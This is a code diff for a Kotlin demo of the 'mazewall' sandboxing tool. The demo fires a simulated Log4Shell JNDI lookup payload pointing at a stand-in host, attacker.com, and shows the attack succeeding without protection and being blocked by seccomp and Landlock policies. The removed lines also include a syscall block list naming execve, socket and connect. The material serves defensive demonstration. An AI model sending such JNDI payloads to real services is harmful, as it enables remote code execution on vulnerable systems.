@@ -1,116 +1,96 @@
 package demo
 
-import io.mazewall.enforcer.diagnostics.ContainmentViolationDetector
 import io.mazewall.enforcer.api.ContainmentViolationException
-import java.io.File
+import io.mazewall.enforcer.diagnostics.ContainmentViolationDetector
 import kotlin.system.exitProcess
 
 fun main(args: Array<String>) {
     val mode = args.getOrNull(0) ?: "all"
-
-    when (mode) {
-        "unsafe" -> runUnsafe()
-        "safe" -> runSafe()
+    val report = when (mode) {
+        "unsafe" -> DemoReport(listOf(runUnsafe()))
+        "safe" -> DemoReport(listOf(runSafe()))
         "profile" -> runProfileAndEnforce()
         "both" -> {
-            // 'both' is a subset of 'all' (runs unsafe + safe, skips the profiler phase).
-            // Prefer 'all' for the full demonstration. Use 'profile' for the profiler phase alone.
             println("Note: 'both' mode runs unsafe + safe only. Use 'all' for the complete demonstration.")
             println("=== Running in UNSAFE mode ===")
-            runUnsafe()
+            val unsafe = runUnsafe()
             println("\n=== Running in SAFE mode ===")
-            runSafe()
+            DemoReport(listOf(unsafe, runSafe()))
         }
         "all" -> {
             println("=== Running in UNSAFE mode ===")
-            runUnsafe()
+            val unsafe = runUnsafe()
             println("\n=== Running in SAFE mode ===")
-            runSafe()
+            val safe = runSafe()
             println()
-            runProfileAndEnforce()
+            DemoReport(listOf(unsafe, safe) + runProfileAndEnforce().results)
         }
         "--help", "-h", "help" -> {
-            println(
-                """
-                Usage: DemoApp [mode]
-
-                Modes:
-                  unsafe   Simulate a Log4Shell exploit with no protection active.
-                           Shows the attack succeeding and a marker file created.
-
-                  safe     Simulate the same exploit with Policy.NO_EXEC protection.
-                           Shows the kernel blocking execve() via Seccomp-BPF.
-
-                  profile  Full Profile -> Enforce -> Breach -> io_uring evasion showcase.
-                           Phases 1-6 with ANSI output. Requires Linux + Landlock support.
-
-                  all      Run all modes sequentially (default if no argument given).
-
-                  both     Run unsafe + safe only (subset of 'all', no profiler phase).
-
-                  --help   Show this help message.
-            """.trimIndent(),
-            )
+            printHelp()
+            return
         }
         else -> {
             println("Unknown mode: '$mode'. Run with --help for usage.")
             exitProcess(1)
         }
     }
+    println("\n${report.summary()}")
+    if (!report.passed) exitProcess(2)
 }
 
-fun runUnsafe() {
-    val marker = File("/tmp/pwned_unsafe")
-    marker.delete()
-
+internal fun runUnsafe(): ScenarioResult = DemoFixture.create("unsafe").use { fixture ->
     println("\u001b[31;1m[STATUS] BEHAVIORAL PROTECTION: INACTIVE\u001b[0m")
     println("Context: A vulnerable library receives a malicious payload.")
-    println("Expected Behavior: Log the string.")
-    println("Actual Behavior:   Exploit triggers unauthorized \u001b[1mexecve()\u001b[0m.")
-
-    val payload = $$"${jndi:ldap://attacker.com/Exploit?cmd=touch,/tmp/pwned_unsafe}"
-    UnsafeRunner.run(payload)
-
-    if (marker.exists()) {
-        println("\u001b[31;1m[SECURITY ALERT] SYSTEM COMPROMISED!\u001b[0m")
-        println("The exploit successfully bypassed Java security and modified the filesystem.")
-    }
+    val payload = "\${jndi:ldap://attacker.com/Exploit?cmd=touch,${fixture.marker.absolutePath}}"
+    val outcome = runCatching { UnsafeRunner.run(payload) }.fold(
+        onSuccess = {
+            if (fixture.marker.exists()) {
+                println("\u001b[31;1m[SECURITY ALERT] SYSTEM COMPROMISED!\u001b[0m")
+                ScenarioOutcome.Completed("attack created its marker")
+            } else {
+                ScenarioOutcome.InfrastructureFailure(IllegalStateException("exploit returned without creating its marker"))
+            }
+        },
+        onFailure = ScenarioOutcome::InfrastructureFailure,
+    )
+    ScenarioResult("unprotected exploit", ExpectedResult.ALLOWED, outcome)
 }
 
-fun runSafe() {
-    val marker = File("/tmp/pwned_safe")
-    marker.delete()
-
+internal fun runSafe(): ScenarioResult = DemoFixture.create("safe").use { fixture ->
     println("\u001b[32;1m[STATUS] BEHAVIORAL PROTECTION: ACTIVE\u001b[0m")
-    println("\u001b[34;1m[CLIPBOARD] Bill of Behavior (BoB) for 'worker-thread':\u001b[0m")
+    println("Contract: \u001b[1mPolicy.NO_EXEC\u001b[0m + \u001b[1mPolicy.NO_NETWORK\u001b[0m")
+    val payload = "\${jndi:ldap://attacker.com/Exploit?cmd=touch,${fixture.marker.absolutePath}}"
+    val observed = try {
+        SafeRunner.run(payload)
+        ScenarioOutcome.Completed("attack returned")
+    } catch (failure: ContainmentViolationException) {
+        val diagnostic = ContainmentViolationDetector.diagnose(failure)
+            ?: return@use ScenarioResult(
+                "protected exploit",
+                ExpectedResult.DENIED,
+                ScenarioOutcome.InfrastructureFailure(failure),
+            )
+        ScenarioOutcome.Denied(diagnostic.evidence.name)
+    } catch (failure: Throwable) {
+        ScenarioOutcome.InfrastructureFailure(failure)
+    }
+    val outcome = if (fixture.marker.exists()) ScenarioOutcome.Completed("attack created its marker") else observed
+    ScenarioResult("protected exploit", ExpectedResult.DENIED, outcome)
+}
+
+private fun printHelp() {
     println(
         """
-        {
-          "syscalls": {
-            "allow": ["read", "write", "mmap", "exit"],
-            "block": ["execve", "fork", "socket", "connect"],
-            "action": "EPERM"
-          }
-        }
+        Usage: DemoApp [mode]
+
+        Modes:
+          unsafe   Run the exploit without protection; attack success is expected.
+          safe     Run it with NO_EXEC + NO_NETWORK; kernel denial is expected.
+          profile  Profile, enforce, and run positive and negative controls.
+                   The native file probe is synchronous; io_uring is not exercised.
+          all      Run every mode (default).
+          both     Run unsafe + safe only.
+          --help   Show this message.
         """.trimIndent(),
     )
-
-    println("Contract: \u001b[1mPolicy.NO_EXEC\u001b[0m + \u001b[1mPolicy.NO_NETWORK\u001b[0m")
-    println("Context:  Malicious JNDI payload received.")
-
-    val payload = $$"${jndi:ldap://attacker.com/Exploit?cmd=touch,/tmp/pwned_safe}"
-
-    try {
-        println("Action:   Attempting unauthorized execve()...")
-        SafeRunner.run(payload)
-    } catch (e: ContainmentViolationException) {
-        val diagnostic = ContainmentViolationDetector.diagnose(e) ?: throw e
-        println("\u001b[32;1m[BOUNCER] SYSCALL INTERCEPTED!\u001b[0m")
-        println("The operation was blocked; evidence: ${diagnostic.evidence}.")
-        println("Java Exception: \u001b[33m${diagnostic.cause.javaClass.simpleName}: ${diagnostic.cause.message}\u001b[0m")
-    }
-
-    if (!marker.exists()) {
-        println("\u001b[32m[RESULT]\u001b[0m Integrity maintained. Exploit failed.")
-    }
 }
